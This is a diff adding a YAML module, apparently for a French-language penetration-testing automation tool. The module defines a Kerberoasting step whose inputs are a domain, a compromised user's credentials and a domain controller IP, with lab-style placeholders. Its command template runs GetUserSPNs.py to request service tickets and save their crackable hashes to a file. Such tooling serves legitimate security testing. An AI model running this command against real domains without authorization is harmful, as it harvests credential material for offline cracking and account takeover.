@@ -1,0 +1,24 @@
+id: Kerberoasting
+name: Kerberoasting
+category: Exploitation
+description: ""
+checklist_keys: ["kerberoast"] 
+inputs:
+  - name: domain
+    label: Domaine
+    placeholder: north.sevenkingdoms.local
+  - name: username
+    label: Utilisateur (Compromis)
+    placeholder: guest
+  - name: password
+    label: Mot de passe
+    placeholder: password
+  - name: dc_ip
+    label: IP du DC
+    placeholder: 192.168.56.11
+command: "GetUserSPNs.py {{domain}}/{{username}}:'{{password}}' -dc-ip {{dc_ip}} -request -outputfile /workspace/kerberoast_hashes.txt"
+
+parsing:
+  mode: "line"
+  save_results: false # <--- Empêche l'affichage dans l'onglet Résultats
+  ip_extract: ".*"
